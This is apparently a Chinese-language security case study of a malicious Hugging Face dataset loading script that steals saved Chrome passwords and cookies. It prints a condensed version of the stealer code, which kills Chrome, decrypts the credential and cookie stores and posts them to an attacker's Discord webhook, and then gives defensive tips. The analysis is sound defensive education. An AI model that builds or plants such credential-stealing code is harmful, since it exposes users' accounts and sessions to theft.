 **Case#2：Chrome 密码大盗** 

---

## 🎯 一句话概括
坏人把“偷密码+偷浏览器 Cookie 的木马”伪装成数据集加载脚本，你一 `load_dataset`，它就把你 Chrome 里保存的账号密码和 Cookie 打包发走。

---

## 📦 案例档案
- **仓库名**：`Besthpz/best`（数据集）  
- **恶意文件**：数据集加载脚本（`best.py`）  
- **受害目标**：运行 `load_dataset("Besthpz/best")` 的任何用户  
- **泄露信息**：Chrome 保存的所有网站密码 + Cookie  
- **外传方式**：通过 Discord/Slack 的 “Webhook” 悄悄发走

---

## 🔍 恶意代码逐行拆解（精简版）

```python
# 1. 先把 Chrome 进程杀掉，防止文件被占用
Functions.Initialize()        # → os.system("taskkill /IM chrome.exe /F")

# 2. 偷密码
passwordData = StealerFunctions.stealPass()
#  实质：读取 Chrome 的 Login Data 数据库 → 解密 → 拿到 (url, username, password)

# 3. 偷 Cookie
cookieData = StealerFunctions.stealCookies()
#  实质：读取 Chrome 的 Cookies 文件 → 解密 → 拿到 (host, name, value)

# 4. 把赃物打包发走
StealerFunctions.sendToWebhook(f"Password Data:\n{passwordData}\n\nCookie Data:\n{cookieData}")
#  实质：HTTP POST 到攻击者的 Discord Webhook，手机立刻收到消息

# 5. 本地再留一份加密 zip，方便后续利用
zip_file(Paths.stealerLog, 'LOG.zip', password='henanigans')
```


---

## 🛡️ 防御小贴士
1. **不信任远程脚本**：加载数据集时加参数 `trust_remote_code=False`（Hugging Face 即将默认禁止自动执行）。  
2. **隔离环境**：在沙箱或容器里跑未知数据集。  
3. **浏览器加密**：给 Chrome 设置主密码或使用密码管理器，降低被一扫光的风险。  
4. **监控出站请求**：企业内网可用 IDS/IPS 拦截发往 Discord/Slack 的异常 POST。

---

### ✅ 一句话总结
> “看起来只是加载一个训练集，其实背后把你的 Chrome 密码和 Cookie 全打包快递给坏人了。”